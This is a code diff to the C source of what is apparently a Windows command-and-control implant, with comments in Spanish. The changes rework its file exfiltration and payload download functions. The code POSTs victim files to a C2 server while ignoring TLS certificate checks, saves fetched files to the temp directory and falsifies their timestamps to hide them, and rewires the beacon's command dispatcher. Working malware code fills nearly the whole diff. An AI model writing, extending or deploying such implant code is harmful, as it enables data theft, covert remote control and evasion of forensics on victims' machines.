@@ -260,6 +260,7 @@ unsigned char OBF_USER_AGENT[] = { $OBF_UA_BYTES, 0 };
 #define INVALID_SOCKET (SOCKET)(~0)
 #endif
 #define USER_AGENT  L"$USER_AGENT"
+#define USER_AGENT_A "$USER_AGENT"
 #define IMAGE_DOS_SIGNATURE 0x5A4D
 #define IMAGE_NT_SIGNATURE 0x00004550
 #define IMAGE_NT_OPTIONAL_HDR32_MAGIC 0x10b
@@ -2323,21 +2324,11 @@ char* getNetworkConfig() {
     return exec_cmd("ipconfig /all");
 }
 
-BOOL handleUpload(const char* command) {
-    const char* filePath = command + strlen("download:");
-    if (!filePath || strlen(filePath) == 0) {
-        printf("[-] Invalid upload command\n");
-        return FALSE;
-    }
-
-    if (!FileExistsA(filePath)) {
-        printf("[-] File not found: %s\n", filePath);
-        return FALSE;
-    }
-
+BOOL UploadFileToC2(const char* url, const char* filePath) {
     FILE* fp = fopen(filePath, "rb");
     if (!fp) {
         printf("[-] Cannot open file: %s\n", filePath);
+        fflush(stdout);
         return FALSE;
     }
 
@@ -2346,89 +2337,185 @@ BOOL handleUpload(const char* command) {
     fseek(fp, 0, SEEK_SET);
 
     BYTE* fileData = malloc(fileSize);
+    if (!fileData) {
+        fclose(fp);
+        return FALSE;
+    }
     fread(fileData, 1, fileSize, fp);
     fclose(fp);
 
+    const char* boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
     const char* filename = strrchr(filePath, '\\\\');
     filename = filename ? filename + 1 : filePath;
 
-    // Construir multipart/form-data
-    char boundary[37] = {0};
-    const char* charset = "abcdefghijklmnopqrstuvwxyz0123456789";
-    for (int i = 0; i < 36; i++) boundary[i] = charset[rand() % 36];
+    // Calcular tamaño del cuerpo multipart
+    DWORD bodySize = 0;
+    bodySize += strlen("--") + strlen(boundary) + strlen("\r\n");
+    bodySize += strlen("Content-Disposition: form-data; name=\\"file\\"; filename=\\"") + strlen(filename) + strlen("\\"\r\n");
+    bodySize += strlen("Content-Type: application/octet-stream\r\n\r\n");
+    bodySize += fileSize;
+    bodySize += strlen("\r\n--") + strlen(boundary) + strlen("--\r\n");
 
-    size_t headerLen = strlen("--") + strlen(boundary) + strlen("\r\n") +
-                       strlen("Content-Disposition: form-data; name=\\"file\\"; filename=\\"") +
-                       strlen(filename) + strlen("\\"\r\n") +
-                       strlen("Content-Type: application/octet-stream\r\n\r\n");
+    char* body = malloc(bodySize);
+    if (!body) {
+        free(fileData);
+        return FALSE;
+    }
 
-    size_t footerLen = strlen("\r\n--") + strlen(boundary) + strlen("--\r\n");
-    size_t totalLen = headerLen + fileSize + footerLen;
-
-    char* body = malloc(totalLen + 1);
     char* ptr = body;
-
     ptr += sprintf(ptr, "--%s\r\n", boundary);
-    ptr += sprintf(ptr, "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n", filename);
+    ptr += sprintf(ptr, "Content-Disposition: form-data; name=\\"file\\"; filename=\\"%s\\"\r\n", filename);
     ptr += sprintf(ptr, "Content-Type: application/octet-stream\r\n\r\n");
     memcpy(ptr, fileData, fileSize);
     ptr += fileSize;
     ptr += sprintf(ptr, "\r\n--%s--\r\n", boundary);
 
-    body[totalLen] = '\0';
+    free(fileData);
 
-    // URL y headers
-    char url[512];
-    snprintf(url, sizeof(url), "%s%s/upload", C2_URL, MALEABLE);
+    HINTERNET hSession = NULL;
+    HINTERNET hConnect = NULL;
+    HINTERNET hRequest = NULL;
+    BOOL result = FALSE;
 
-    char contentType[512];
-    snprintf(contentType, sizeof(contentType), "Content-Type: multipart/form-data; boundary=%s", boundary);
+    do {
+        hSession = WinHttpOpen(
+            USER_AGENT,
+            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+            WINHTTP_NO_PROXY_NAME,
+            WINHTTP_NO_PROXY_BYPASS,
+            0
+        );
+        if (!hSession) break;
 
-    // Enviar multipart
-    HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) goto cleanup;
+        // Parse URL
+        char host[256], path[512];
+        int port = 443;
+        const char* host_start = url;
+        BOOL secure = FALSE;
 
-    HINTERNET hConnect = WinHttpConnect(hSession, LC2_HOST, C2_PORT, 0);
-    if (!hConnect) goto cleanup;
+        if (strncmp(url, "https://", 8) == 0) {
+            host_start = url + 8;
+            port = 443;
+            secure = TRUE;
+        } else if (strncmp(url, "http://", 7) == 0) {
+            host_start = url + 7;
+            port = 80;
+            secure = FALSE;
+        } else {
+            break;
+        }
 
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/upload", NULL,
-                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                            WINHTTP_FLAG_SECURE);
-    if (!hRequest) goto cleanup;
+        const char* path_start = strchr(host_start, '/');
+        const char* port_start = strchr(host_start, ':');
 
-    DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
-                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
-                  SECURITY_FLAG_IGNORE_UNKNOWN_CA;
-    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+        if (port_start && (!path_start || port_start < path_start)) {
+            int host_len = port_start - host_start;
+            strncpy(host, host_start, host_len);
+            host[host_len] = '\0';
+            port = atoi(port_start + 1);
+            if (path_start) {
+                strcpy(path, path_start);
+            } else {
+                strcpy(path, "/");
+            }
+        } else if (path_start) {
+            int host_len = path_start - host_start;
+            strncpy(host, host_start, host_len);
+            host[host_len] = '\0';
+            strcpy(path, path_start);
+        } else {
+            strcpy(host, host_start);
+            strcpy(path, "/");
+        }
 
-    if (!WinHttpAddRequestHeaders(hRequest, UTF8ToWide(contentType), -1,
-                                  WINHTTP_ADDREQ_FLAG_ADD)) {
-        printf("[-] Failed to add Content-Type header\n");
-        goto cleanup;
-    }
+        hConnect = WinHttpConnect(hSession, UTF8ToWide(host), port, 0);
+        if (!hConnect) break;
 
-    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                            body, totalLen, totalLen, 0)) {
-        printf("[-] Upload send failed\n");
-        goto cleanup;
-    }
+        DWORD request_flags = secure ? WINHTTP_FLAG_SECURE : 0;
+        hRequest = WinHttpOpenRequest(
+            hConnect,
+            L"POST",
+            UTF8ToWide(path),
+            NULL,
+            WINHTTP_NO_REFERER,
+            WINHTTP_DEFAULT_ACCEPT_TYPES,
+            request_flags
+        );
+        if (!hRequest) break;
 
-    if (!WinHttpReceiveResponse(hRequest, NULL)) {
-        printf("[-] Upload receive failed\n");
-        goto cleanup;
-    }
+        if (secure) {
+            DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                          SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                          SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+            WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+        }
 
-    printf("[+] Uploaded: %s\n", filePath);
-    return TRUE;
+        // === Añadir Content-Type multipart ===
+        char contentType[256];
+        snprintf(contentType, sizeof(contentType), "Content-Type: multipart/form-data; boundary=%s", boundary);
+        WCHAR wContentType[512];
+        MultiByteToWideChar(CP_UTF8, 0, contentType, -1, wContentType, 512);
+        if (!WinHttpAddRequestHeaders(hRequest, wContentType, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
+            printf("[-] Failed to add Content-Type header\n");
+            break;
+        }
 
-cleanup:
+        // === Enviar cuerpo multipart ===
+        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, body, bodySize, bodySize, 0)) {
+            printf("[-] WinHttpSendRequest failed\n");
+            break;
+        }
+
+        if (!WinHttpReceiveResponse(hRequest, NULL)) {
+            printf("[-] WinHttpReceiveResponse failed\n");
+            break;
+        }
+
+        DWORD statusCode = 0;
+        DWORD statusCodeSize = sizeof(statusCode);
+        if (WinHttpQueryHeaders(hRequest,
+            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+            NULL, &statusCode, &statusCodeSize, NULL)) {
+            if (statusCode == 200) {
+                printf("[+] Upload successful (HTTP 200)\n");
+                result = TRUE;
+            } else {
+                printf("[-] Upload failed (HTTP %lu)\n", statusCode);
+            }
+        }
+
+    } while (0);
+
     if (hRequest) WinHttpCloseHandle(hRequest);
     if (hConnect) WinHttpCloseHandle(hConnect);
     if (hSession) WinHttpCloseHandle(hSession);
-    free(fileData);
-    free(body);
+    if (body) free(body);
+
+    return result;
 }
+
+// === handleUpload: envía del beacon al C2 ===
+BOOL handleUpload(const char* command) {
+    const char* filePath = command + 7;  // "upload:"
+    if (!filePath || !strlen(filePath)) return FALSE;
+
+    if (!FileExistsA(filePath)) {
+        printf("[-] File not found: %s", filePath);
+        return FALSE;
+    }
+
+    char uploadUrl[512];
+    snprintf(uploadUrl, sizeof(uploadUrl), "%s%s/upload", C2_URL, MALEABLE);
+
+    if (UploadFileToC2(uploadUrl, filePath)) {
+        printf("[+] Uploaded: %s", filePath);
+        return TRUE;
+    }
+    printf("[-] Failed to upload: %s", filePath);
+    return FALSE;
+}
+
 // Función para verificar si un archivo existe
 BOOL FileExistsA(const char* filePath) {
     return GetFileAttributesA(filePath) != INVALID_FILE_ATTRIBUTES;
@@ -4802,39 +4889,26 @@ void handleAtomic(char* command) {
     fflush(stdout);
 }
 
+// === handleDownload: descarga del C2 al beacon ===
 BOOL handleDownload(const char* command) {
-    const char* filename = command + strlen("upload:");
-    if (!filename || strlen(filename) == 0) {
-        printf("[-] Invalid download command\n");
-        return FALSE;
-    }
+    const char* filename = command + 9;  // "download:"
+    if (!filename || !strlen(filename)) return FALSE;
 
     char downloadUrl[512];
-    snprintf(downloadUrl, sizeof(downloadUrl), "%s%sdownload/%s", C2_URL, MALEABLE, filename);
+    snprintf(downloadUrl, sizeof(downloadUrl), "%s%s/download/%s", C2_URL, MALEABLE, filename);
 
     char localPath[MAX_PATH];
-    if (!GetCurrentDirectoryA(MAX_PATH, localPath)) {
-        printf("[-] Failed to get current directory\n");
-        return FALSE;
-    }
-
-    // Asegurar barra al final
-    int len = strlen(localPath);
-    if (len > 0 && localPath[len - 1] != '\\\\' && localPath[len - 1] != '/') {
-        strcat(localPath, "\\\\");
-    }
+    GetTempPathA(MAX_PATH, localPath);
     strcat(localPath, filename);
 
     if (DownloadFromURL(downloadUrl, localPath)) {
         obfuscateFileTimestamp(localPath);
-        printf("[+] Download success: %s\n", localPath);
+        printf("[+] Downloaded: %s", localPath);
         return TRUE;
-    } else {
-        printf("[-] Failed to download: %s\n", downloadUrl);
-        return FALSE;
     }
+    printf("[-] Failed to download: %s", downloadUrl);
+    return FALSE;
 }
-
 
 // Función principal de manejo de comandos
 void handleAdversary(char* command) {
@@ -4992,10 +5066,27 @@ void handleAdversary(char* command) {
     }
 
     if (strncmp(command, "upload:", 7) == 0) {
-        if (handleDownload(command)) {
-            snprintf(output, sizeof(output), "Downloaded from C2: -> %s", command);
+        const char* filePath = command + 7;
+        if (!filePath || !strlen(filePath)) {
+            printf("[-] Invalid upload command\n");
+            goto send_response;
+        }
+
+        if (!FileExistsA(filePath)) {
+            printf("[-] File not found: %s\n", filePath);
+            goto send_response;
+        }
+
+        // === Usa la URL correcta ===
+        char uploadUrl[512];
+        snprintf(uploadUrl, sizeof(uploadUrl), "%s%s/upload", C2_URL, MALEABLE);
+
+        if (UploadFileToC2(uploadUrl, filePath)) {
+            printf("[+] Uploaded: %s\n", filePath);
+            snprintf(output, sizeof(output), "Uploaded: %s", filePath);
         } else {
-            snprintf(error, sizeof(error), "Download from C2 failed: %s", command);
+            printf("[-] Upload failed: %s\n", filePath);
+            snprintf(error, sizeof(error), "Upload failed: %s", filePath);
         }
         goto send_response;
     }
@@ -5017,11 +5108,10 @@ void handleAdversary(char* command) {
         goto send_response;
     }
     if (strncmp(command, "download:", 9) == 0) {
-
-        if (handleUpload(command)) {
-            snprintf(output, sizeof(output), "File uploaded: %s", command);
+        if (handleDownload(command)) {
+            snprintf(output, sizeof(output), "Downloaded: %s", command + 9);
         } else {
-            snprintf(error, sizeof(error), "Upload failed");
+            snprintf(error, sizeof(error), "Download failed");
         }
         goto send_response;
     }
